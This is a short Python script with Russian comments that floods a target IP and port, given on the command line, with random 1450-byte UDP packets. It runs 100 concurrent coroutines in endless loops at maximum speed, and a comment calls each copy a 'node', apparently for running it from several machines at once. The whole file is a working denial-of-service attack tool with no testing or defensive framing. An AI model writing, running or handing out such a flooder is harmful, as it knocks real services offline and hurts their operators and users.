import asyncio
import os
import sys

# Настройки пакета
PAYLOAD_SIZE = 1450 

async def udp_sender(ip, port, payload):
    # Создаем сокет на низком уровне через asyncio
    loop = asyncio.get_running_loop()
    transport, _ = await loop.create_datagram_endpoint(
        lambda: asyncio.DatagramProtocol(),
        remote_addr=(ip, port)
    )
    
    print(f"[Worker] Stream started...")
    try:
        while True:
            transport.sendto(payload)
            await asyncio.sleep(0) # Максимальная скорость
    except Exception:
        pass
    finally:
        transport.close()

async def main():
    if len(sys.argv) < 3:
        return
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    payload = os.urandom(PAYLOAD_SIZE)

    # Запускаем 100 параллельных корутин на одну ноду
    tasks = [udp_sender(target_ip, target_port, payload) for _ in range(100)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
